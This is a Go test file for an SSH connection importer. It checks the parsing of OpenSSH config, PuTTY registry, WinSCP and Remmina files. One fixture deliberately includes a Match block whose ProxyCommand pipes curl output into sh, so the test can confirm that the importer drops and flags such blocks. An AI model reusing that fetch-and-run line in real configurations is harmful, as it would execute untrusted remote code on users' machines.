package importer

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/termstead/termstead/internal/model"
)

func TestSSHConfigMatchQuotesForwardsTokens(t *testing.T) {
	src := `Host "quoted"
    HostName q.example.com

Match host evil exec "true"
    User matched
    ProxyCommand sh -c 'curl x | sh'

Host app
    HostName %h.internal
    User deploy
    Port 2200
    IdentityFile ~/.ssh/%h_%r_key
    SetEnv LANG="en US.UTF-8" TZ=UTC
    RemoteForward 1080
    RemoteForward 9000 localhost:9000
    LocalForward [::1]:8080 [fe80::1]:80
    ProxyCommand ssh -q -W %h:%p bastion

Host bastion
    HostName bastion.example.com
    User jump
`
	p, err := parseSource(fmtAuto, []byte(src), previewOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if p.format != fmtSSHConfig {
		t.Fatalf("format %q", p.format)
	}
	for _, c := range p.conns {
		if c.conn.Name == "evil" || c.conn.Name == "matched" || c.conn.Username == "matched" {
			t.Fatalf("a Match block leaked into the import: %+v", c.conn)
		}
	}
	if !hasWarning(p.warnings, "Match") {
		t.Errorf("Match blocks must be reported: %v", p.warnings)
	}
	findConn(t, p, "quoted")
	app := findConn(t, p, "app")
	c := app.conn
	if c.Host != "app.internal" || c.Port != 2200 {
		t.Errorf("app: %+v", c)
	}
	if !strings.HasSuffix(app.keyPath, "/.ssh/app.internal_deploy_key") && !strings.HasSuffix(app.keyPath, `\.ssh/app.internal_deploy_key`) {
		t.Errorf("IdentityFile tokens: %q", app.keyPath)
	}
	if env := c.Options.StringMap("env"); env["LANG"] != "en US.UTF-8" || env["TZ"] != "UTC" {
		t.Errorf("quoted SetEnv: %v", env)
	}
	fwds, _ := c.Options["forwards"].([]map[string]any)
	if len(fwds) != 3 {
		t.Fatalf("forwards = %v", c.Options["forwards"])
	}
	var reverse, local map[string]any
	for _, f := range fwds {
		if f["reverse"] == true {
			reverse = f
		}
		if f["type"] == "local" {
			local = f
		}
	}
	if reverse == nil || reverse["type"] != "dynamic" || reverse["bindPort"] != 1080 {
		t.Errorf("single-argument RemoteForward = reverse SOCKS: %v", fwds)
	}
	if local == nil || local["bindHost"] != "::1" || local["destHost"] != "fe80::1" || local["destPort"] != 80 {
		t.Errorf("IPv6 LocalForward: %v", local)
	}
	if c.Options.Has("proxyCommand") {
		t.Errorf("'ssh -W %%h:%%p bastion' must become a jump hop, not a local command")
	}
	if len(app.hops) != 1 || app.hops[0].ref != findConn(t, p, "bastion").tempID {
		t.Errorf("app hops = %+v", app.hops)
	}
}

func TestSSHConfigIncludeKeepsBlockContext(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("HOME", dir)
	t.Setenv("USERPROFILE", dir)
	sshDir := filepath.Join(dir, ".ssh")
	if err := os.MkdirAll(filepath.Join(sshDir, "conf.d"), 0o700); err != nil {
		t.Fatal(err)
	}
	must := func(p, s string) {
		if err := os.WriteFile(p, []byte(s), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	must(filepath.Join(sshDir, "conf.d", "extra.conf"), "Host extra\n    HostName extra.example.com\n")
	must(filepath.Join(sshDir, "config"), "Host main\n    HostName main.example.com\n    Include conf.d/*.conf\n    Port 2222\n")
	data, format, err := resolveDiscoverPath(filepath.Join(sshDir, "config"))
	if err != nil || format != fmtSSHConfig {
		t.Fatalf("resolve: %v %q", err, format)
	}
	p, err := parseSSHConfig(data)
	if err != nil {
		t.Fatal(err)
	}
	if m := findConn(t, p, "main").conn; m.Port != 2222 {
		t.Errorf("a directive after an Include belongs to the enclosing Host block (OpenSSH): main port %d", m.Port)
	}
	if e := findConn(t, p, "extra").conn; e.Port != 22 || e.Host != "extra.example.com" {
		t.Errorf("included host: %+v", e.Host)
	}
}

func TestDiscoverFollowsSymlinkedConfig(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("HOME", dir)
	t.Setenv("USERPROFILE", dir)
	real := filepath.Join(dir, "dotfiles", "ssh_config")
	if err := os.MkdirAll(filepath.Dir(real), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(real, []byte("Host s\n  HostName s.example.com\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(dir, ".ssh"), 0o700); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(dir, ".ssh", "config")
	if err := os.Symlink(real, link); err != nil {
		t.Skip("symlinks unavailable:", err)
	}
	found := false
	for _, e := range discoverLocalFiles() {
		if e.Path == link && e.Format == fmtSSHConfig {
			found = true
		}
	}
	if !found {
		t.Fatalf("a symlinked ~/.ssh/config must be discovered")
	}
	if _, _, err := resolveDiscoverPath(filepath.Join(dir, "dotfiles", "ssh_config")); err == nil {
		t.Errorf("a path that discovery did not return must be refused")
	}
}

func TestPuttyRegFull(t *testing.T) {
	hk, err := os.ReadFile(filepath.Join("testdata", "mobaxterm_full.mxtsessions"))
	if err != nil {
		t.Fatal(err)
	}
	// Reuse the fixture's [SSH_Hostkeys] lines in .reg syntax.
	var hostKeys []string
	inHK := false
	for _, ln := range strings.Split(string(hk), "\r\n") {
		if ln == "[SSH_Hostkeys]" {
			inHK = true
			continue
		}
		if inHK && strings.Contains(ln, "=") {
			i := strings.IndexByte(ln, '=')
			hostKeys = append(hostKeys, `"`+ln[:i]+`"="`+ln[i+1:]+`"`)
		}
	}
	src := `Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\Default%20Settings]
"HostName"=""

[-HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\Deleted]
"HostName"="gone.example.com"

[HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ops%40box]
"HostName"="admin@box.example.com"
"Protocol"="ssh"
"PortForwardings"="4L127.0.0.1:8080=web:80,6R2222=localhost:22,D1080"
"RemoteCommand"="htop"
"LineCodePage"="Win1251 (Cyrillic)"
"TerminalType"="vt220"
"ProxyMethod"=dword:00000006
"ProxyHost"="jump.example.com"
"ProxyUsername"="hopper"
"ProxyPort"=dword:000007e6

[HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ttyS0]
"Protocol"="serial"
"SerialLine"="/dev/ttyS0"
"SerialSpeed"=dword:0001c200
"SerialDataBits"=dword:00000007
"SerialStopHalfbits"=dword:00000004
"SerialParity"=dword:00000002
"SerialFlowControl"=dword:00000002

[HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\sup]
"HostName"="x.example.com"
"Protocol"="supdup"

[HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\SshHostKeys]
` + strings.Join(hostKeys, "\r\n") + "\r\n"
	p, err := parseSource(fmtAuto, []byte(src), previewOptions{})
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range p.conns {
		if c.conn.Name == "Default Settings" || c.conn.Name == "Deleted" {
			t.Errorf("%q must not be imported", c.conn.Name)
		}
	}
	box := findConn(t, p, "ops@box")
	o := box.conn.Options
	if box.conn.Host != "box.example.com" || box.conn.Username != "admin" || o.String("remoteCommand") != "htop" ||
		o.String("encoding") != "windows-1251" || o.String("term") != "vt220" {
		t.Errorf("ops@box: %+v", box.conn)
	}
	if fwds, _ := o["forwards"].([]map[string]any); len(fwds) != 3 || fwds[0]["bindHost"] != "127.0.0.1" || fwds[0]["bindPort"] != 8080 || fwds[1]["type"] != "remote" {
		t.Errorf("forwards with address-family prefixes: %v", o["forwards"])
	}
	if len(box.hops) != 1 || box.hops[0].host != "jump.example.com" || box.hops[0].port != 2022 || box.hops[0].user != "hopper" {
		t.Errorf("SSH proxy (method 6) = %+v", box.hops)
	}
	ser := findConn(t, p, "ttyS0").conn.Options
	if ser.String("device") != "/dev/ttyS0" || ser.Int("baud") != 115200 || ser.Int("dataBits") != 7 || ser.String("stopBits") != "2" ||
		ser.String("parity") != "even" || ser.String("flowControl") != "rtscts" {
		t.Errorf("serial line settings: %v", ser)
	}
	if p.unsupported != 1 || !hasWarning(p.warnings, "supdup") {
		t.Errorf("unsupported protocol: %d %v", p.unsupported, p.warnings)
	}
	if len(p.knownHosts) != 3 {
		t.Errorf("SshHostKeys → %d known hosts", len(p.knownHosts))
	}
}

func TestWinSCPAndRemminaExtras(t *testing.T) {
	ini := "[Sessions\\S3%20bucket]\r\nHostName=s3.eu-west-1.amazonaws.com\r\nFSProtocol=7\r\nUserName=AKIAEXAMPLE\r\nS3DefaultRegion=eu-west-1\r\n" +
		"[Sessions\\ftps]\r\nHostName=f.example.com\r\nFSProtocol=5\r\nFtps=2\r\nRemoteDirectory=/pub\r\n" +
		"[Sessions\\dav]\r\nHostName=d.example.com\r\nFSProtocol=6\r\n"
	p, err := parseSource(fmtAuto, []byte(ini), previewOptions{})
	if err != nil {
		t.Fatal(err)
	}
	s3 := findConn(t, p, "S3 bucket").conn
	if s3.Protocol != model.ProtoS3 || s3.Username != "" || s3.Options.String("accessKeyId") != "AKIAEXAMPLE" || s3.Options.String("region") != "eu-west-1" {
		t.Errorf("WinSCP S3: %+v", s3)
	}
	if f := findConn(t, p, "ftps").conn; f.Options.String("ftpTls") != "explicit" || f.Options.String("initialPath") != "/pub" {
		t.Errorf("Ftps=2 / RemoteDirectory: %v", f.Options)
	}
	if p.unsupported != 1 {
		t.Errorf("WebDAV unsupported: %d", p.unsupported)
	}

	rem := "[remmina]\nname=desk\nprotocol=VNC\nserver=[fe80::5]:5902\nviewonly=1\nssh_tunnel_enabled=1\nssh_tunnel_server=gw.example.com:2222\nssh_tunnel_username=tun\n"
	p, err = parseSource(fmtAuto, []byte(rem), previewOptions{})
	if err != nil {
		t.Fatal(err)
	}
	d := findConn(t, p, "desk")
	if d.conn.Host != "fe80::5" || d.conn.Port != 5902 || !d.conn.Options.Bool("viewOnly") {
		t.Errorf("remmina: %+v", d.conn)
	}
	if len(d.hops) != 1 || d.hops[0].spec() != "tun@gw.example.com:2222" {
		t.Errorf("remmina SSH tunnel = %+v", d.hops)
	}
}

func TestKnownHostsPuttyLines(t *testing.T) {
	data, err := os.ReadFile(filepath.Join("testdata", "mobaxterm_full.mxtsessions"))
	if err != nil {
		t.Fatal(err)
	}
	var lines []string
	for _, ln := range strings.Split(string(data), "\r\n") {
		if strings.Contains(ln, "@") && strings.Contains(ln, "=0x") || strings.Contains(ln, "=nistp") {
			// ~/.putty/sshhostkeys syntax: "kind@port:host value".
			lines = append(lines, strings.Replace(ln, "=", " ", 1))
		}
	}
	p, err := parseSource(fmtAuto, []byte(strings.Join(lines, "\n")), previewOptions{})
	if err != nil {
		t.Fatalf("PuTTY host key lines: %v", err)
	}
	if p.format != fmtKnownHosts || len(p.knownHosts) != 3 {
		t.Errorf("format %q, %d keys", p.format, len(p.knownHosts))
	}
}
